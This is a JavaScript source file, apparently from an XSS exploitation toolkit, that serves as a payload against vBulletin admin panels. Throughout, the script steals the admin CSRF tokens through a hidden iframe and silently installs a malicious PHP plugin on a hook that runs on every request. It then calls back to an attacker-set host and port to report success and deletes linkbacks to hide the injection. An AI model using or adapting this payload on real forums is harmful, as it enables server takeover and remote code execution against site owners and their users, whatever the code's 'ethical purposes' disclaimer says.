/*
Title: vBulletin Core Payload (Plugin)
Author: MaXe / InterN0T
Updated by: Hans-Michael Varbaek
Company: VarBITS

Version: 2.75

Changelog:
- Ver 2.75 : Changed coding style to be more consistent.
             Fixed various deprecated functions.
             Various other minor improvements.
- Ver 2.5  : Added XMLHttpRequest for JS Notification.
- Ver 2.0  : First release.

Special Credits: InterN0T and Sense of Security (Versions 2.0 to 2.5)

For ethical and legal purposes only. This script is provided as is and without warranty.

TODO:
- For pre-existing forms, consider using FormData to read and update/set new values in the future:
https://developer.mozilla.org/en-US/docs/Web/API/FormData/Using_FormData_Objects
https://developer.mozilla.org/en-US/docs/Web/API/FormData
https://developer.mozilla.org/en-US/docs/Web/API/FormData/set
-- Update or add another payload which uses FormData() and XMLHttpRequest()
*/

// Some IDEs may complain that silent_inject() is not used. (It is used.)
// noinspection JSUnusedGlobalSymbols
function silent_inject() {

    // Read and save the adminhash + securitytoken - For bypassing the CSRF protection.
    // noinspection Annotator
    var adminhash = top.document.getElementById('silent_frame').contentDocument.cpform.adminhash.value;
    // noinspection Annotator
    var securitytoken = top.document.getElementById('silent_frame').contentDocument.cpform.securitytoken.value;

    // TODO: Use the pre-existing form in the future if possible.
    // Prepopulated form that adds a new plugin to vBulletin
    // The adminhash and securitytoken parameters are CSRF tokens
    // The phpcode parameter value is updated by the (xsser.py) python script
    var form_input = '<input type="hidden" name="do" value="update">';
    form_input += '<input type="hidden" name="adminhash" value="'+adminhash+'">';
    form_input += '<input type="hidden" name="securitytoken" value="'+securitytoken+'">';
    form_input += '<input type="hidden" name="product" value="vbulletin">';
    form_input += '<input type="hidden" name="hookname" value="misc_start">';
    form_input += '<input type="hidden" name="title" value="vBSpecial">';
    form_input += '<input type="hidden" name="executionorder" value="5">';
    form_input += '<input type="hidden" name="phpcode" value=\'PHP_PAYLOAD\'>';
    form_input += '<input type="hidden" name="active" value="1">';
    form_input += '<input type="hidden" name="pluginid" value="">';
    // Note: The HTML input was changed because python's "jsmin" would treat the content as comments.

    // A function which injects our prepopulated form
    function silent_form_inject(action, method, content) {
        var silent_main_tag = document.createElement('form');

        // The inner contents of our form is equal to the content variable - This is the legacy way of doing it.
        silent_main_tag.innerHTML = ' '+content;
        top.document.getElementById('silent_frame').contentDocument.body.appendChild(silent_main_tag);
        silent_main_tag.setAttribute('id', 'varbits');
        silent_main_tag.setAttribute('name', 'varbits');
        silent_main_tag.setAttribute('action', action);
        silent_main_tag.setAttribute('method', method);
    }

    // Inject our prepopulated form
    silent_form_inject('plugin.php?do=update', 'POST', form_input);

    // Submit our payload automatically - There's no turning back now
    //if (document.cookie.indexOf("XSS_Infected") == -1) {
    // TODO: Make the "XSS_Infected" cookie name a function argument for silent_inject()
    // TODO: Maybe move document.cookie.match() to the beginning of silent_inject()
    if (!document.cookie.match(/^(.*;)?\s*XSS_Infected\s*=\s*[^;]+(.*)?$/)) {
        // TODO: Maybe move submit() down to after the notification, but before SetCookie()
        top.document.getElementById('silent_frame').contentDocument.getElementById('varbits').submit();

        // Specifically located in this section to prevent double-loading of the URL
        var request = new XMLHttpRequest(); // Initiate XMLHttpRequest
        request.open("GET", "http://CALLBACKHOST:CALLBACKPORT/js_shell_notify.txt");
        // Method and URL to send the request to - Hostname and port are set by: xsser.py
        request.send(); // Send the request

        SetCookie("XSS_Infected", "true"); // Prevent re-infection / loops
        // TODO: Maybe change the cookie name and value in the future.
    }

    // Give the malicious linkback two seconds to inject our payload, before self-removal
    // Old method: var end = setTimeout("clean_up()", 2000);
    setTimeout(function() {
        clean_up();
    }, 2000);

}

// TODO: Replace the contents of this function with a "place-holder" variable in the next version.
// TODO: This variable, is then replaced, depending on the component being exploited.
// Delete all linkBacks on the current page - Including our injected XSS+JS payload.
function clean_up() {
    // noinspection Annotator
    js_check_all_option(document.linkbacks, -1);
    // noinspection Annotator
    document.linkbacks.submit();
    // The JS function and DOM property above, are defined by vBulletin.
    // TODO: Maybe use native methods for "check all checkboxes" or something similar.
}

// TODO: Look into HTML5 Storage instead of cookies maybe.
// A function to create a cookie so the infection happens only once.
function SetCookie(cookieName, cookieContent) {
    var cookiePath = '/';
    var expDate=new Date();
    expDate.setTime(expDate.getTime()+372800000);
    var expires=expDate.toUTCString();
    // document.cookie=cookieName+"="+escape(cookieContent)+";path="+escape(cookiePath)+";expires="+expires;
    // The escape function has been deprecated.
    document.cookie=cookieName+"="+encodeURIComponent(cookieContent)+";path="+encodeURI(cookiePath)+";expires="+expires;
}

// If our cookie is not present, continue.
// Old method: document.cookie.indexOf("XSS_Infected") == -1
// TODO: Turn this into a function where "XSS_Infected" will be an argument
if (!document.cookie.match(/^(.*;)?\s*XSS_Infected\s*=\s*[^;]+(.*)?$/)) {
    // Append a (hidden) iframe to the HTML body for data injection
    var mainframe = document.createElement("iframe");
    mainframe.setAttribute('id', 'silent_frame');
    top.document.body.appendChild(mainframe);
    mainframe.setAttribute('onload', 'main.silent_inject()');
    mainframe.setAttribute('src', 'plugin.php?do=add');
}
